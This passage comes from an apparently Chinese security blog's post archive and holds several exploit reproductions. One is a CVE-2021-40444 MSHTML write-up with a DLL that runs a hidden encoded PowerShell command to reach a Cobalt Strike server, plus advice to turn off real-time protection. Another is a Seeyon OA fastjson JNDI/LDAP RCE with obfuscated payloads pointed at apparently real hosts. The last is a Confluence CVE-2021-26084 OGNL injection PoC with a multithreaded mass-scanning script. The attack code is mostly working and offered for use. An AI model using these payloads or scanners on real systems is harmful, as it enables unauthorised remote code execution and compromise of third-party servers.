exploit.py generate test&#x2F;calc.dll http:&#x2F;&#x2F;23.91.97.29:97</span><br><span class="line">python3 exploit.py host 97</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927120247351.png" alt="image-20210927120247351"></p><p>生成得docx在out目录下</p><p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927122225118.png" alt="image-20210927122225118"></p><p>要关闭实时防护</p><p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927122304182.png" alt="image-20210927122304182"></p><p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927121041900.png" alt="image-20210927121041900"></p><h2 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h2><p>cs先生成powershell</p><p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927121229111.png" alt="image-20210927121229111"></p><p>替换system字符中得内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &quot;windows.h&quot;</span><br><span class="line">#include &lt;cstdlib&gt;</span><br><span class="line"></span><br><span class="line">void exec(void) &#123;</span><br><span class="line">    system(&quot;powershell -nop -w hidden -encodedcommand xxxxx&quot;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI DllMain(</span><br><span class="line">    HINSTANCE hinstDLL,</span><br><span class="line">    DWORD fdwReason,</span><br><span class="line">    LPVOID lpReserved)</span><br><span class="line">&#123;</span><br><span class="line">    switch (fdwReason)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        exec();</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用vs2019生成dll，工具栏中 生成—生成解决方案</p><p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927121505989.png" alt="image-20210927121505989"></p><p>把生成得Dll1.dll放在test目录下，然后像上面弹计算器一样生成对应得docx</p><p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927121628503.png" alt="image-20210927121628503"></p><p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927121912010.png" alt="image-20210927121912010"></p><p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927121846219.png" alt="image-20210927121846219"></p><p>其实我感觉挺鸡肋得，因为已经被微软标记得妈都不认识了，不关闭实时访问也无法利用成功</p><p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927122112426.png" alt="image-20210927122112426"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 钓鱼 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>致远OA-fastjson-rce回显</title>
      <link href="2021/09/09/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/"/>
      <url>2021/09/09/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">V7.1、V7.1SP1</span><br><span class="line">V7.0、V7.0SP1、V7.0SP2、V7.0SP3</span><br><span class="line">V6.1、V6.1SP1、V6.1SP2</span><br><span class="line">V6.0、V6.0SP1</span><br><span class="line">V5.6、V5.6SP1</span><br></pre></td></tr></table></figure><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>第一种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;main.do?method&#x3D;changeLocale HTTP&#x2F;1.1</span><br><span class="line">Host: 223.199.152.165:8088</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko&#x2F;20100101 Firefox&#x2F;47.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Cookie: JSESSIONID&#x3D;5CC67B9F2061656D0529AB3208F7CEA3</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">cmd: dir</span><br><span class="line">Content-Length: 694</span><br><span class="line"></span><br><span class="line">_json_params&#x3D;&#123;&quot;name&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073&quot;,&quot;\u0076\u0061\u006c&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;&#125;,&quot;x&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;,&quot;\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065&quot;:&quot;ldap:&#x2F;&#x2F;t7hfci.dnslog.cn&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/image-20210909171916791.png" alt="image-20210909171916791"></p><p>第二种fofa上找了不少目标，感觉命中极少</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;sursenServlet HTTP&#x2F;1.1</span><br><span class="line">Host: oa.ydysj.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Length: 950</span><br><span class="line">cmd: whoami</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">sursenData&#x3D;%7B%22name%22%3A%7B%22%5Cu0040%5Cu0074%5Cu0079%5Cu0070%5Cu0065%22%3A%22%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu002e%5Cu006c%5Cu0061%5Cu006e%5Cu0067%5Cu002e%5Cu0043%5Cu006c%5Cu0061%5Cu0073%5Cu0073%22%2C%22%5Cu0076%5Cu0061%5Cu006c%22%3A%22%5Cu0063%5Cu006f%5Cu006d%5Cu002e%5Cu0073%5Cu0075%5Cu006e%5Cu002e%5Cu0072%5Cu006f%5Cu0077%5Cu0073%5Cu0065%5Cu0074%5Cu002e%5Cu004a%5Cu0064%5Cu0062%5Cu0063%5Cu0052%5Cu006f%5Cu0077%5Cu0053%5Cu0065%5Cu0074%5Cu0049%5Cu006d%5Cu0070%5Cu006c%22%7D%2C%22x%22%3A%7B%22%5Cu0040%5Cu0074%5Cu0079%5Cu0070%5Cu0065%22%3A%22%5Cu0063%5Cu006f%5Cu006d%5Cu002e%5Cu0073%5Cu0075%5Cu006e%5Cu002e%5Cu0072%5Cu006f%5Cu0077%5Cu0073%5Cu0065%5Cu0074%5Cu002e%5Cu004a%5Cu0064%5Cu0062%5Cu0063%5Cu0052%5Cu006f%5Cu0077%5Cu0053%5Cu0065%5Cu0074%5Cu0049%5Cu006d%5Cu0070%5Cu006c%22%2C%22%5Cu0064%5Cu0061%5Cu0074%5Cu0061%5Cu0053%5Cu006f%5Cu0075%5Cu0072%5Cu0063%5Cu0065%5Cu004e%5Cu0061%5Cu006d%5Cu0065&quot;:&quot;ldap:&#x2F;&#x2F;dwz227.dnslog.cn&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/image-20210909172138193.png" alt="image-20210909172138193"></p><h2 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h2><p>feihong-cs回显项目<a href="https://github.com/feihong-cs/JNDIExploit">https://github.com/feihong-cs/JNDIExploit</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -p 0909 -i 23.91.97.29</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;main.do?method&#x3D;changeLocale HTTP&#x2F;1.1</span><br><span class="line">Host: 223.199.152.165:8088</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko&#x2F;20100101 Firefox&#x2F;47.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Cookie: JSESSIONID&#x3D;5CC67B9F2061656D0529AB3208F7CEA3</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">cmd: whoami</span><br><span class="line">Content-Length: 711</span><br><span class="line"></span><br><span class="line">_json_params&#x3D;&#123;&quot;name&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073&quot;,&quot;\u0076\u0061\u006c&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;&#125;,&quot;x&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;,&quot;\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065&quot;:&quot;ldap:&#x2F;&#x2F;23.91.97.29:1389&#x2F;Basic&#x2F;TomcatEcho&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/image-20210909172446201.png" alt="image-20210909172446201"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PY学习-cve-2021-26084批量验证脚本</title>
      <link href="2021/09/08/PY%E5%AD%A6%E4%B9%A0-cve-2021-26084%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC/"/>
      <url>2021/09/08/PY%E5%AD%A6%E4%B9%A0-cve-2021-26084%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>先放POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;pages&#x2F;createpage-entervariables.action?SpaceKey&#x3D;x HTTP&#x2F;1.1</span><br><span class="line">Host: wiki.weiwenjia.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.2; WOW64) AppleWebKit&#x2F;537.36 (KHTML like Gecko) Chrome&#x2F;44.0.2403.155 Safari&#x2F;537.36</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Cookie: JSESSIONID&#x3D;CDEF1127BA542DB39717A08AF71E836A</span><br><span class="line">Content-Length: 1068</span><br><span class="line"></span><br><span class="line">queryString&#x3D;aaaaaaaa%5Cu0027%2B%7BClass.forName%28%5Cu0027javax.script.ScriptEngineManager%5Cu0027%29.newInstance%28%29.getEngineByName%28%5Cu0027JavaScript%5Cu0027%29.%5Cu0065val%28%5Cu0027var+isWin+%3D+java.lang.System.getProperty%28%5Cu0022os.name%5Cu0022%29.toLowerCase%28%29.contains%28%5Cu0022win%5Cu0022%29%3B+var+cmd+%3D+new+java.lang.String%28%5Cu0022id%5Cu0022%29%3Bvar+p+%3D+new+java.lang.ProcessBuilder%28%29%3B+if%28isWin%29%7Bp.command%28%5Cu0022cmd.exe%5Cu0022%2C+%5Cu0022%2Fc%5Cu0022%2C+cmd%29%3B+%7D+else%7Bp.command%28%5Cu0022bash%5Cu0022%2C+%5Cu0022-c%5Cu0022%2C+cmd%29%3B+%7Dp.redirectErrorStream%28true%29%3B+var+process%3D+p.start%28%29%3B+var+inputStreamReader+%3D+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3B+var+bufferedReader+%3D+new+java.io.BufferedReader%28inputStreamReader%29%3B+var+line+%3D+%5Cu0022%5Cu0022%3B+var+output+%3D+%5Cu0022%5Cu0022%3B+while%28%28line+%3D+bufferedReader.readLine%28%29%29+%21%3D+null%29%7Boutput+%3D+output+%2B+line+%2B+java.lang.Character.toString%2810%29%3B+%7D%5Cu0027%29%7D%2B%5Cu0027</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/PY%E5%AD%A6%E4%B9%A0-cve-2021-26084%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC/image-20210908172352970.png" alt="image-20210908172352970"></p><p>单个验证脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#python3.exe C:&#x2F;Users&#x2F;i&#x2F;PycharmProjects&#x2F;pythonProject3&#x2F;main.py https:&#x2F;&#x2F;wiki.servoneering.com</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">from requests.packages import urllib3</span><br><span class="line">urllib3.disable_warnings()#关闭不影响执行的https错误信息</span><br><span class="line"></span><br><span class="line">header &#x3D; &#123;</span><br><span class="line">        &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko&#x2F;20100101 Firefox&#x2F;47.0&#39;,</span><br><span class="line">        &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,</span><br><span class="line">        &#39;Accept&#39;: &#39;*&#x2F;*&#39;,</span><br><span class="line">        &#39;Connection&#39;: &#39;close&#39;,</span><br><span class="line">        &#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">requrl &#x3D; &quot;&#x2F;pages&#x2F;createpage-entervariables.action?SpaceKey&#x3D;x&quot;</span><br><span class="line"></span><br><span class="line">PocData &#x3D; &#123;&quot;queryString&quot;: &quot;aaaaaaaa\\u0027+&#123;Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin &#x3D; java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd &#x3D; new java.lang.String(\\u0022whoami\\u0022);var p &#x3D; new java.lang.ProcessBuilder(); if(isWin)&#123;p.command(\\u0022cmd.exe\\u0022, \\u0022&#x2F;c\\u0022, cmd); &#125; else&#123;p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); &#125;p.redirectErrorStream(true); var process&#x3D; p.start(); var inputStreamReader &#x3D; new java.io.InputStreamReader(process.getInputStream()); var bufferedReader &#x3D; new java.io.BufferedReader(inputStreamReader); var line &#x3D; \\u0022\\u0022; var output &#x3D; \\u0022\\u0022; while((line &#x3D; bufferedReader.readLine()) !&#x3D; null)&#123;output &#x3D; output + line + java.lang.Character.toString(10); &#125;\\u0027)&#125;+\\u0027&quot;&#125;#data注意参数和数据中间用：</span><br><span class="line"></span><br><span class="line">session &#x3D; requests.Session()</span><br><span class="line"></span><br><span class="line">def check(hosts):</span><br><span class="line"></span><br><span class="line">    target &#x3D; hosts+requrl</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        reponse &#x3D; session.post(url&#x3D;target, headers&#x3D;header, data&#x3D;PocData, verify&#x3D;False)#要加verify&#x3D;False，不然https的站会报错</span><br><span class="line">        soup &#x3D; BeautifulSoup(reponse.text, &#39;html.parser&#39;)</span><br><span class="line">        queryStringValue &#x3D; soup.find(&#39;input&#39;, attrs&#x3D;&#123;&#39;name&#39;: &#39;queryString&#39;, &#39;type&#39;: &#39;hidden&#39;&#125;)[&#39;value&#39;]</span><br><span class="line"></span><br><span class="line">        if queryStringValue:</span><br><span class="line">            print(&quot;存在漏洞，whoami:&#123;&#125;&quot;.format(queryStringValue))</span><br><span class="line">            pass</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;不存在&quot;)</span><br><span class="line">            pass</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;error&quot;)</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    hostfile&#x3D;sys.argv[1]</span><br><span class="line">    check(hostfile)</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/PY%E5%AD%A6%E4%B9%A0-cve-2021-26084%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC/image-20210908172743607.png" alt="image-20210908172743607"></p><p>批量验证脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#C:\Users\i\PycharmProjects\pythonProject3\venv\Scripts\python.exe C:&#x2F;Users&#x2F;i&#x2F;PycharmProjects&#x2F;pythonProject3&#x2F;main.py C:\Users\i\Desktop\CVE-2021-26084_Confluence-main\x.txt</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">from requests.packages import urllib3</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import threading</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">mutex &#x3D; threading.Lock()</span><br><span class="line">pool &#x3D; ThreadPoolExecutor(max_workers&#x3D;100)</span><br><span class="line"></span><br><span class="line">header &#x3D; &#123;</span><br><span class="line">        &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko&#x2F;20100101 Firefox&#x2F;47.0&#39;,</span><br><span class="line">        &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,</span><br><span class="line">        &#39;Accept&#39;: &#39;*&#x2F;*&#39;,</span><br><span class="line">        &#39;Connection&#39;: &#39;close&#39;,</span><br><span class="line">        &#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">requrl &#x3D; &quot;&#x2F;pages&#x2F;createpage-entervariables.action?SpaceKey&#x3D;x&quot;</span><br><span class="line"></span><br><span class="line">PocData &#x3D; &#123;&quot;queryString&quot;: &quot;aaaaaaaa\\u0027+&#123;Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin &#x3D; java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd &#x3D; new java.lang.String(\\u0022whoami\\u0022);var p &#x3D; new java.lang.ProcessBuilder(); if(isWin)&#123;p.command(\\u0022cmd.exe\\u0022, \\u0022&#x2F;c\\u0022, cmd); &#125; else&#123;p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); &#125;p.redirectErrorStream(true); var process&#x3D; p.start(); var inputStreamReader &#x3D; new java.io.InputStreamReader(process.getInputStream()); var bufferedReader &#x3D; new java.io.BufferedReader(inputStreamReader); var line &#x3D; \\u0022\\u0022; var output &#x3D; \\u0022\\u0022; while((line &#x3D; bufferedReader.readLine()) !&#x3D; null)&#123;output &#x3D; output + line + java.lang.Character.toString(10); &#125;\\u0027)&#125;+\\u0027&quot;&#125;</span><br><span class="line"></span><br><span class="line">session &#x3D; requests.Session()</span><br><span class="line"></span><br><span class="line">def check(hosts):</span><br><span class="line"></span><br><span class="line">    target &#x3D; hosts+requrl</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        reponse &#x3D; session.post(url&#x3D;target, headers&#x3D;header, data&#x3D;PocData, verify&#x3D;False)</span><br><span class="line">        soup &#x3D; BeautifulSoup(reponse.text, &#39;html.parser&#39;)#这一步和下一步用来从返回包中查找指定数据</span><br><span class="line">        queryStringValue &#x3D; soup.find(&#39;input&#39;, attrs&#x3D;&#123;&#39;name&#39;: &#39;queryString&#39;, &#39;type&#39;: &#39;hidden&#39;&#125;)[&#39;value&#39;]</span><br><span class="line">        if queryStringValue:</span><br><span class="line">            if &quot;whoami&quot; in queryStringValue:</span><br><span class="line">                pass</span><br><span class="line">            elif queryStringValue:</span><br><span class="line">                print(&quot;&#123;0&#125;存在漏洞，whoami:&#123;1&#125;&quot;.format(hosts,queryStringValue))</span><br><span class="line">                pass</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;&#123;&#125;不存在&quot;.format(hosts))</span><br><span class="line">                pass</span><br><span class="line">    except:</span><br><span class="line">        #print(&quot;&#123;&#125;无法访问&quot;.format(hosts))</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    hostfile&#x3D;sys.argv[1]</span><br><span class="line">    hf&#x3D;open(hostfile,&#39;r&#39;)</span><br><span class="line">    for host in hf.readlines():</span><br><span class="line">        pool.submit(check,host.strip(&#39;\n&#39;))#调用多线程传递方法和参数</span><br><span class="line">    hf.close()</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/PY%E5%AD%A6%E4%B9%A0-cve-2021-26084%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC/image-20210908173319223.png" alt="image-20210908173319223"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 脚本编写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PY学习-fofa导出数据添加http或https</title>
      <link href="2021/09/08/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/"/>
      <url>2021/09/08/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/</url>
      
